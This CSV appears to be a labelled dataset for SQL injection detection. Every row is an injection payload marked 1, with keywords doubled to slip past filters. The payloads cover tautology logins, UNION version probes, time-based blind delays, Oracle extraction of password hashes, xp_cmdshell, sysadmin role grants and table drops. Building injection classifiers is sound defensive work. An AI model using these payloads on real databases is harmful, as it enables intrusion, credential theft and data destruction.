Query,Label
" seselectlect * ffromrom users whwhereere id  =  11<1# uunionnion seselectlect 1,version  (    )   -- 1",1
   )    )    oorr    (    (   'x'   )    )     =     (    (   'x,1
" selecselectt * frofromm users whewherere id  =  '1' oorr \.<1 uunionnion selecselectt 1,@@VERSION -- 1'",1
" selecselectt * frofromm users wwherehere id  =  '1' <@&1 uunionnion selecselectt 1,version  (    )   -- 1'",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  tabltablee_name  )   frfromom   (  seleselectct DiissTiinnCT  (  tabltablee_name  )  , ROWNUM AS llimitimit frfromom sys.all_tabltablees  )   whwhereere llimitimit  =  4   )    )    aandnd 'i'  =  'i",1
; if iiss_srvrolemember  (  'sysadmiinn'  )   > 0 waitfoorr delay '0:0:2' --,1
selecselectt * frfromom users whewherere id  =  1 <@<@ oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users wwherehere id  =  1 uniunionon seselectlect @<@$,version  (    )   -- 1",1
" seleselectct * frofromm users wherwheree id  =  '1' <@<@ uniunionon seleselectct 1,version  (    )   -- 1'",1
" seselectlect * ffromrom users wwherehere id  =  1 oorr ""$_"" oorr 1  =  1 -- 1",1
" selecselectt * frfromom users whewherere id  =  1 oorr 1#""{ ununionion selecselectt version  (    )  ,version  (    )   -- 1",1
a' oorr 1  =  1--,1
 )   oorr   (  a  =  a,1
"""   )    )    oorr    (    (   ""x""   )    )     =     (    (   ""x",1
" selecselectt * frfromom users wherwheree id  =  1 oorr 1#""; oorr 1  =  1 -- 1",1
" selselectect * frfromom users whewherere id  =  '1' <@$_ uniunionon selselectect 1,version  (    )   -- 1'",1
-- &passwoorrd  = ,1
seselectlect * ffromrom users wwherehere id  =  1 <@. oorr 1  =  1 -- 1,1
" selselectect * frofromm users wwherehere id  =  1 oorr ""  (    )  "" oorr 1  =  1 -- 1",1
" seselectlect * ffromrom users whwhereere id  =  1 %$ 1 uniunionon seselectlect nunullll,@@VERSION -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  granted_role  )   ffromrom   (  sselectelect DiissTiinnCT  (  granted_role  )  , ROWNUM AS llimitimit ffromrom dba_role_privs whwhereere GRANTEE  =  SYS.LOGiinnUSER  )   whwhereere llimitimit  =  3   )    )    anandd 'i'  =  'i",1
 oorr '1'  =  '1,1
admiinn' oorr 1  =  1,1
" seleselectct * ffromrom users whwhereere id  =  1 oorr "";,""  =  1 oorr 1  =  1 -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 ununionion seleselectct @||1,version  (    )   -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 +\+. uniunionon sselectelect nulnulll,@@VERSION -- 1",1
" seselectlect * frfromom users whewherere id  =  1 oorr ""  )  ,"" oorr 1  =  1 -- 1",1
" uunionnion sselectelect * ffromrom users wwherehere logiinn   =   char  (  114,111,111,116  )  ;",1
" selselectect * frofromm users whewherere id  =  1 oorr 1#""? uunionnion selselectect 1,version  (    )   -- 1",1
 oorr 1  =  1--,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  granted_role  )   frofromm   (  sselectelect DiissTiinnCT  (  granted_role  )  , ROWNUM AS limilimitt frofromm dba_role_privs wherwheree GRANTEE  =  SYS.LOGiinnUSER  )   wherwheree limilimitt  =  5   )    )    aandnd 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ oorr 3  =  3 --,1
" sselectelect * ffromrom users whwhereere id  =  1 -1<@ uniounionn sselectelect 1,version  (    )   -- 1",1
" seleselectct * frfromom users whewherere id  =  1 oorr ""$#"" oorr 1  =  1 -- 1",1
 )   uniunionon selecselectt * frfromom iinnfoorrmation_schema.tabltablees;,1
" seleselectct * ffromrom users whewherere id  =  1 oorr ""  )  ]"" oorr 1  =  1 -- 1",1
"  )   oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect COUNT  (  DiissTiinnCT  (  column_name   )    )    frofromm sys.all_tab_columns   )    )    anandd 'i'  =  'i,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  tatableble_name  )   ffromrom   (  sselectelect DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS llimitimit ffromrom sys.all_tatablebles  )   wwherehere llimitimit  =  7   )    )    anandd 'i'  =  'i",1
""" oorr """" """,1
dedeletelete,1
;waitfoorr delay '0:0:__TIME__'--,1
 oorr 1  =  1 --,1
1' aandnd non_exiisstant_tabtablele   =   '1,1
" selecselectt * frofromm users whwhereere id  =  1 oorr ""&  )  "" oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users whewherere id  =  '1' + $ . uniunionon sselectelect 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   seselectlect @s   =   0x77616974 ...,1
x' anandd userid iiss nunullll; --,1
" selecselectt * frfromom users wwherehere id  =  1 oorr "";["" oorr 1  =  1 -- 1",1
" seleselectct * ffromrom users wwherehere id  =  '1' oorr \.<   =  1 uniunionon seleselectct 1,@@VERSION -- 1'",1
" selecselectt * ffromrom users wwherehere id  =  1 uniunionon selecselectt @<@,version  (    )   -- 1",1
" sselectelect * frofromm users whewherere id  =  1 -@<@ ununionion sselectelect 1,version  (    )   -- 1",1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect host_name frfromom v$iinnstance   )    )    anandd 'i'  =  'i,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  column_name  )   ffromrom   (  selselectect DiissTiinnCT  (  column_name  )  , ROWNUM AS lilimitmit ffromrom all_tab_columns  )   wherwheree lilimitmit  =  2   )    )    aandnd 'i'  =  'i",1
sselectelect * frfromom users whewherere id  =  1 +   (  \+  )   oorr 1  =  1 -- 1,1
" selecselectt * frfromom users whwhereere id  =  1 oorr "".["" oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users whwhereere id  =  1 oorr ""  (  ["" oorr 1  =  1 -- 1",1
ununionion ALL sselectelect,1
" seselectlect * frfromom users whwhereere id  =  1 oorr ""1#"" oorr 1  =  1 -- 1",1
seselectlect * frofromm users wwherehere id  =  1 oorr \<1 oorr 1  =  1 -- 1,1
" seleselectct * frfromom users whewherere id  =  1 | |1 uniounionn seleselectct 1,banner frfromom v$version whewherere rownum  =  1 -- 1",1
x' oorr full_name liklikee '%bob%,1
x' anandd members.email iiss nunullll; --,1
 oorr 2 > 1,1
seselectlect * frofromm users wherwheree id  =  1.*1 oorr 1  =  1 -- 1,1
"""  )   oorr pg_sleep  (  __TIME__  )  --",1
 ',1
" sselectelect * frfromom users wwherehere id  =  1 oorr $<\. uniunionon sselectelect 1,@@VERSION -- 1",1
" seleselectct * frofromm users wherwheree id  =  1 oorr ""@  )  "" oorr 1  =  1 -- 1",1
seleselectct * frofromm users whewherere id  =  1 oorr \.<$ oorr 1  =  1 -- 1,1
 )   oorr sleep  (  __TIME__  )    =  ',1
sleep 50',1
" sselectelect * ffromrom users whwhereere id  =  '1' + 1||1 ununionion sselectelect 1,banner ffromrom v$version whwhereere rownum  =  1 -- 1'",1
sselectelect * frofromm users wherwheree id  =  1 + $+%\ oorr 1  =  1 -- 1,1
" seselectlect * frofromm users wherwheree id  =  1 oorr "";  (  "" oorr 1  =  1 -- 1",1
oorr sleep  (  __TIME__  )    =  ',1
" selecselectt * frofromm users whwhereere id  =  1 oorr "";_"" oorr 1  =  1 -- 1",1
" seleselectct * ffromrom users wwherehere id  =  1 oorr 1#"". uunionnion seleselectct 1,version  (    )   -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 uniunionon seleselectct  @ $,version  (    )   -- 1",1
" selecselectt * ffromrom users wwherehere id  =  1 uniounionn selecselectt +!<@,version  (    )   -- 1",1
" selselectect * frfromom users whwhereere id  =  1 <@<@ uunionnion selselectect nunullll,version  (    )   -- 1",1
oorr 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythiinng' oorr 'x'  =  'x,1
" selecselectt * ffromrom users whewherere id  =  1 oorr \<\ uniunionon selecselectt 1,@@VERSION -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 uniunionon seleselectct   (  1  )  ,banner frfromom v$version wwherehere rownum  =  1 -- 1",1
" selecselectt * frofromm users whewherere id  =  1 *  (  \  )   uniunionon selecselectt nunullll,@@VERSION -- 1",1
&',1
a' oorr 3  =  3--,1
" selecselectt * frfromom users wherwheree id  =  '1' oorr $+<$ uniunionon selecselectt 1,@@VERSION -- 1'",1
" selecselectt * ffromrom users wherwheree id  =  1 +1 ununionion selecselectt 1,banner ffromrom v$version wherwheree rownum  =  1 -- 1",1
"admiinn""oorr 1  =  1 oorr """"  =  """,1
uni/**/on sel/**/ect,1
""" oorr """"&""",1
 )    )   ;waitfoorr delay '0:0:__TIME__'--,1
" seselectlect * frofromm users whewherere id  =  1 oorr ""?;"" oorr 1  =  1 -- 1",1
1 waitfoorr delay '0:0:10'--,1
bfilename,1
admiinn'  )   oorr   (  '1'  =  '1'--,1
UEf,1
 -- &passwoorrd  = ,1
1 oorr sleep  (  __TIME__  )  #,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  tatableble_name  )   frofromm   (  seleselectct DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS lilimitmit frofromm sys.all_tatablebles  )   whwhereere lilimitmit  =  6   )    )    anandd 'i'  =  'i",1
" selecselectt * frfromom users wwherehere id  =  '1' uniunionon selecselectt $[""],@@VERSION -- 1'",1
" selselectect * frofromm users whewherere id  =  '1' + @  (  1  )   uunionnion selselectect 1,version  (    )   -- 1'",1
1' aandnd 1  =    (  seselectlect count  (  *  )   ffromrom tabtablelenames  )  ; --,1
oorr sleep  (  __TIME__  )  #,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  granted_role  )   frofromm   (  selselectect DiissTiinnCT  (  granted_role  )  , ROWNUM AS lilimitmit frofromm dba_role_privs wherwheree GRANTEE  =  SYS.LOGiinnUSER  )   wherwheree lilimitmit  =  8   )    )    aandnd 'i'  =  'i",1
" seleselectct * frofromm users wwherehere id  =  1 oorr 1#"",  =  1 oorr 1  =  1 -- 1",1
||6,1
oorr 1/*,1
" anandd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
selselectect * frfromom users wwherehere id  =  1.%@ oorr 1  =  1 -- 1,1
" selecselectt * frfromom users whwhereere id  =  1 oorr ""..""  =  1 oorr 1  =  1 -- 1",1
" seselectlect * ffromrom users whwhereere id  =  1 oorr 1&@#  =  1 uniounionn seselectlect 1,version  (    )   -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr "";]"" oorr 1  =  1 -- 1",1
" oorr 1  =  1 oorr """"  =  ",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  selselectect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS llimitimit frofromm SYS.USER$  )   wwherehere llimitimit  =  7   )    )    anandd 'i'  =  'i",1
seselectlect * ffromrom users wherwheree id  =  1 oorr $<\. oorr 1  =  1 -- 1,1
" selselectect * ffromrom users wwherehere id  =  1 *  (  1  )   uniunionon selselectect 1,banner ffromrom v$version wwherehere rownum  =  1 -- 1",1
oorr 'whatever' iinn   (  'whatever'  ) ,1
declare @s varchar   (  200  )   seleselectct @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
seselectlect * frfromom users whewherere id  =  '1'   oorr 1  =  1 -- 1',1
?,1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct COUNT  (  DiissTiinnCT  (  ttableable_name   )    )    frfromom sys.all_ttableables   )    )    aandnd 'i'  =  'i,1
" selselectect * ffromrom users wherwheree id  =  '1' uniounionn selselectect @ 1,version  (    )   --  1'",1
"admiinn""  )   oorr   (  ""1""  =  ""1""#",1
" seleselectct * frfromom users whwhereere id  =  1 oorr 1#"", uniunionon seleselectct 'a',version  (    )   -- 1",1
" selselectect * ffromrom users whewherere id  =  1 oorr ""$  (  "" oorr 1  =  1 -- 1",1
 oorr '' ',1
" seleselectct * ffromrom users whwhereere id  =  1 oorr "";#"" oorr 1  =  1 -- 1",1
oorr 1  =  1,1
 ; drdropop tatableble temp --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  PASSWoorrD  )   frfromom   (  sselectelect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit frfromom SYS.USER$  )   whewherere lilimitmit  =  2   )    )    anandd 'i'  =  'i",1
""" oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
""" oorr ""x""  =  ""x",1
selselectect * frofromm users whwhereere id  =  '1'<@.. oorr 1  =  1 -- 1',1
" selselectect * frfromom users whewherere id  =  1 oorr !<@ uniunionon selselectect 1,version  (    )   -- 1",1
 oorr 'somethiinng' lilikeke 'some%',1
; if nnotot   (    (   selecselectt serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 0  )   waitfoorr delay '0:0:2' --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  PASSWoorrD  )   frfromom   (  sselectelect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limilimitt frfromom SYS.USER$  )   whwhereere limilimitt  =  4   )    )    aandnd 'i'  =  'i",1
selecselectt * ffromrom users wherwheree id  =  '1' oorr \<\. oorr 1  =  1 -- 1',1
; exec master..xp_cmdshell 'piinng 10.10.1.2'--,1
admiinn' oorr '1'  =  '1'--,1
; if nnotot   (    (   selselectect serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 1  )   waitfoorr delay '0:0:2' --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  tatableble_name  )   frfromom   (  seselectlect DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS lilimitmit frfromom sys.all_tatablebles  )   wherwheree lilimitmit  =  2   )    )    aandnd 'i'  =  'i",1
" sselectelect * ffromrom users wherwheree id  =  1 <@<@ uunionnion sselectelect version  (    )  ,version  (    )   -- 1",1
" seleselectct * ffromrom users whewherere id  =  1 oorr 1#""$ uniounionn seleselectct nunullll,version  (    )   -- 1",1
""";waitfoorr delay '0:0:__TIME__'--",1
x' anandd userid iiss nunullll; --,1
selselectect * ffromrom users whwhereere id  =  '1' *$ 1 oorr 1  =  1 -- 1',1
" selselectect * frofromm users wwherehere id  =  1 oorr \<\ uniounionn selselectect nnullull,@@VERSION -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr ""?@"" oorr 1  =  1 -- 1",1
’ oorr ‘1’  =  ’1,1
" seleselectct * frofromm users wherwheree id  =  '1' ununionion seleselectct 1a,banner frofromm v$version wherwheree rownum  =  1 -- 1'",1
admiinn'oorr 1  =  1 oorr ''  =  ',1
" selecselectt * ffromrom users wwherehere id  =  '1' oorr !<1 uunionnion selecselectt 1,version  (    )   -- 1'",1
" aandnd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" seleselectct * ffromrom users wwherehere id  =  1 oorr ""_  )  "" oorr 1  =  1 -- 1",1
" selecselectt * frofromm users whwhereere id  =  1 oorr \.<   =  1 uniounionn selecselectt 1,@@VERSION -- 1",1
 oorr 1  =  1,1
sselectelect * frofromm users wwherehere id  =  1 + $+%1 oorr 1  =  1 -- 1,1
" seselectlect * frofromm users wherwheree id  =  1.  uunionnion seselectlect version  (    )  ,version  (    )   -- 1",1
x' aandnd email iiss nnullull; --,1
" selselectect * ffromrom users whwhereere id  =  '1' + @ @1 uniounionn selselectect 1,version  (    )   -- 1'",1
 --,1
" sselectelect * frofromm users whwhereere id  =  '1'   uunionnion sselectelect nulnulll,banner frofromm v$version whwhereere rownum  =  1 -- 1'",1
" sselectelect * ffromrom users whwhereere id  =  11||1 uniunionon sselectelect 1,banner ffromrom v$version whwhereere rownum  =  1 -- 1",1
" selecselectt * frfromom users whewherere id  =  1.*1 uunionnion selecselectt 1,banner frfromom v$version whewherere rownum  =  1 -- 1",1
updatupdatee,1
 oorr 1/*,1
" seleselectct * frofromm users whewherere id  =  1.<1# uniounionn seleselectct 1,version  (    )   -- 1",1
"""   )    )    oorr pg_sleep  (  __TIME__  )  --",1
||'6,1
" seselectlect * ffromrom users whewherere id  =  1. <@ ununionion seselectlect 1,version  (    )   -- 1",1
oorr   (  EXiissTS  ) ,1
^',1
oorr 'text'   =   n'text',1
" selecselectt * ffromrom users wwherehere id  =  1 + \+*$ uunionnion selecselectt nnullull,@@VERSION -- 1",1
" seselectlect * ffromrom users whwhereere id  =  '1' uniunionon seselectlect $ _,@@VERSION -- 1'",1
" seleselectct * frofromm users wwherehere id  =  1 oorr ""  )  ;"" oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users whwhereere id  =  1 <@1$ uniunionon sselectelect 1,version  (    )   -- 1",1
 oorr 0  =  0 --,1
" selecselectt * frfromom users whwhereere id  =  1 oorr ""{1""  =  1 oorr 1  =  1 -- 1",1
" selselectect * frofromm users wherwheree id  =  1 oorr ""{,""  =  1 oorr 1  =  1 -- 1",1
" sselectelect * frofromm users wwherehere id  =  1 oorr 1#"", uniounionn sselectelect version  (    )  ,version  (    )   -- 1",1
" seselectlect * frofromm users wherwheree id  =  1 oorr 1#""? ununionion seselectlect 'a',version  (    )   -- 1",1
passwoorrd:*/  =  1--,1
" sselectelect * ffromrom users wwherehere id  =  1 <@. uunionnion sselectelect 1,version  (    )   -- 1",1
" seselectlect * ffromrom users wherwheree id  =  1 oorr ""  )  @"" oorr 1  =  1 -- 1",1
" selselectect * frofromm users whewherere id  =  '1' ununionion selselectect @ @1,version  (    )   --  1'",1
" uniunionon   (  sselectelect nnullull,   (  sselectelect @@version   )    )    --",1
" seselectlect * ffromrom users wwherehere id  =  1 oorr ""  )  {"" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users whwhereere id  =  1.<@. ununionion selselectect 1,version  (    )   -- 1",1
" seleselectct * frofromm users wherwheree id  =  1 +\. uunionnion seleselectct nunullll,@@VERSION -- 1",1
" selecselectt * frofromm users whewherere id  =  1 + @<@. uunionnion selecselectt 1,version  (    )   -- 1",1
" seselectlect * frfromom users whewherere id  =  1 oorr \<$ uniunionon seselectlect 1,@@VERSION -- 1",1
" selecselectt * ffromrom users whewherere id  =  1 oorr   (  $+  )    =  1 ununionion selecselectt 1,@@VERSION -- 1",1
" seselectlect * frfromom users wherwheree id  =  1 +   (  \+  )   uniunionon seselectlect nnullull,@@VERSION -- 1",1
" selecselectt * frofromm users wherwheree id  =  1. uniounionn selecselectt nnullull,version  (    )   -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr ""  )  ["" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users whwhereere id  =  1 oorr \.<1 uunionnion seleselectct 1,@@VERSION -- 1",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect banner frfromom v$version wwherehere ROWNUM  =  1   )    )    aandnd 'i'  =  'i,1
seselectlect * frfromom users whwhereere id  =  1 <@$_ oorr 1  =  1 -- 1,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  column_name  )   ffromrom   (  selselectect DiissTiinnCT  (  column_name  )  , ROWNUM AS limlimitit ffromrom all_tab_columns  )   whwhereere limlimitit  =  3   )    )    anandd 'i'  =  'i",1
" selecselectt * frofromm users whwhereere id  =  1 oorr $+<$ uunionnion selecselectt 1,@@VERSION -- 1",1
" sselectelect * ffromrom users whewherere id  =  1 oorr ""@%"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  1 oorr $<\ uniounionn seleselectct 1,@@VERSION -- 1",1
" seleselectct * frfromom users whewherere id  =  1 oorr ""%,"" oorr 1  =  1 -- 1",1
uniounionn selselectect,1
aascsc,1
" || myappadmiinn.adduser  (  'admiinn', 'newpass'  )   || '",1
"exec sp_addsrvrolemember 'name' , 'sysadmiinn'",1
" seleselectct * frfromom users wwherehere id  =  1 oorr   (  \  )    =  1 uniunionon seleselectct 1,@@VERSION -- 1",1
  )   oorr true--,1
" seselectlect * frfromom users wherwheree id  =  1 +  (  1  )   uniunionon seselectlect 1,banner frfromom v$version wherwheree rownum  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  PASSWoorrD  )   ffromrom   (  sselectelect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS llimitimit ffromrom SYS.USER$  )   wwherehere llimitimit  =  3   )    )    anandd 'i'  =  'i",1
